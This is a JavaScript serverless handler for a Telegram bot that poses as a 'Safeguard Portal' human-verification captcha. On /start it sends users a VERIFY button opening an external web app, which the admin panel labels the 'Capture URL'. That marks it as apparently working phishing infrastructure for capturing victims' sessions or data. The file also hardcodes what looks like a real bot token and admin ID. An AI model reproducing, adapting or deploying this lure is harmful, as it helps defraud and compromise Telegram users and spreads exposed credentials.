const BOT_TOKEN = "7718337730:AAEMWnNxRvoE4GWEgSXL69A1BLERrqKX03s";
const ADMIN_ID = 7241621112;
const VERIFY_URL = "https://harmonious-stroopwafel-0a6945.netlify.app/";
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const IMAGE_ID = "AgACAgQAAxkBAAIBY2lrEwQvtPlGvcxAEHTJLIsyiLsgAAJGDGsbmyRZU_IWsZnS58IZAQADAgADeQADOAQ";

const VERIFY_MESSAGE = "<b>Verify you're human with Safeguard Portal</b>\n\nClick 'VERIFY' and complete captcha to gain entry";
const ADMIN_MESSAGE = `<b>Admin Panel</b>\n\nStatus: Bot is running\nCapture URL: <code>${VERIFY_URL}</code>`;

async function sendMessage(chat_id, text, reply_markup) {
  const data = { chat_id, text, parse_mode: 'HTML' };
  if (reply_markup) data.reply_markup = reply_markup;
  await fetch(`${API}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
}

async function sendPhoto(chat_id, photo, caption, reply_markup) {
  const data = { chat_id, photo, caption, parse_mode: 'HTML' };
  if (reply_markup) data.reply_markup = reply_markup;
  await fetch(`${API}/sendPhoto`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
}

async function handleMessage(msg) {
  const chat_id = msg.chat.id;
  const user_id = msg.from.id;
  const text = msg.text || '';

  if (text === '/start') {
    const keyboard = { inline_keyboard: [[{ text: 'VERIFY', web_app: { url: VERIFY_URL } }]] };
    await sendPhoto(chat_id, IMAGE_ID, VERIFY_MESSAGE, keyboard);
  } else if (text === '/dev' && user_id === ADMIN_ID) {
    const keyboard = { inline_keyboard: [[{ text: 'Stats', callback_data: 'stats' }], [{ text: 'Get Link', callback_data: 'link' }]] };
    await sendMessage(chat_id, ADMIN_MESSAGE, keyboard);
  }
}

async function handleCallback(callback) {
  const query_id = callback.id;
  const user_id = callback.from.id;
  const chat_id = callback.message.chat.id;
  const message_id = callback.message.message_id;
  const data = callback.data;

  await fetch(`${API}/answerCallbackQuery`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ callback_query_id: query_id })
  });

  if (user_id !== ADMIN_ID) return;

  let text, keyboard;
  if (data === 'stats') {
    text = "<b>Statistics</b>\n\nBot: Online";
    keyboard = { inline_keyboard: [[{ text: 'Back', callback_data: 'back' }]] };
  } else if (data === 'link') {
    text = `<b>Link</b>\n\n<code>${VERIFY_URL}</code>`;
    keyboard = { inline_keyboard: [[{ text: 'Back', callback_data: 'back' }]] };
  } else if (data === 'back') {
    text = ADMIN_MESSAGE;
    keyboard = { inline_keyboard: [[{ text: 'Stats', callback_data: 'stats' }], [{ text: 'Get Link', callback_data: 'link' }]] };
  } else {
    return;
  }

  await fetch(`${API}/editMessageText`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id, message_id, text, parse_mode: 'HTML', reply_markup: keyboard })
  });
}

exports.handler = async (event) => {
  try {
    const body = JSON.parse(event.body);
    if (body.message) await handleMessage(body.message);
    if (body.callback_query) await handleCallback(body.callback_query);
  } catch (e) {
    console.log(e);
  }
  return { statusCode: 200, body: 'OK' };
};
